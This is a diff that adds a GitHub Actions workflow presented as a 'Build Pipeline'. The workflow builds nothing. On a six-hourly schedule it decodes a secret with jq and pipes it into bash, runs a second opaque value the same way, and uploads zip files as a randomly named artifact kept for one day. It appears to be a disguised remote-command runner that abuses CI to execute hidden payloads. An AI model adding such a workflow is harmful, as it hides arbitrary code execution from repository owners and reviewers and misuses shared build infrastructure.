@@ -1,0 +1,32 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          pckey0: ${{ secrets.pckey0 }}
+        run: |
+          printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
+          echo $ijd071 | jq -r .sa548 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: rsc5BS4l
+          path: "*.zip"
+          retention-days: 1
